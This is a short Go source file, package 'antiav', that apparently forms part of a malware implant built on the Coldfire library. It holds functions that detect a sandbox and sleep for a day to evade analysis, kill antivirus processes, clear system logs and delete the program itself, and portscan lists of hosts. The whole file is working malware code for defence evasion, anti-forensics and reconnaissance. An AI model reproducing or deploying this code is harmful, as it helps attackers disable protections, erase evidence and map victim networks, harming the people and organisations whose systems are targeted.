package antiav

import (
	"github.com/redcode-labs/Coldfire"
)


func Sandbox() {
	if coldfire.SandboxAlln(3) {
		coldfire.Wait("1d")
	}
}

func Before() error {
//	go coldfire.SetTtl("7d")
	err := coldfire.PkillAv()
	return err
}

func After() error {
	err := coldfire.ClearLogs()
	coldfire.Remove()
	return err
}

//func Hosts() ([]string, error) {
//	return coldfire.HostsPassive("1h")
//}

func Ports(ips []string) map[string][]int {
	ports := make(map[string][]int)
	threads := Threads()
	if threads >= 2 {
		threads = threads/2
	}
	for _, ip := range ips {
		ports[ip] = coldfire.Portscan(ip, 1, threads)
	}
	return ports
}

func Threads() int {
	return coldfire.StrToInt(coldfire.Info()["cpu_num"])
}
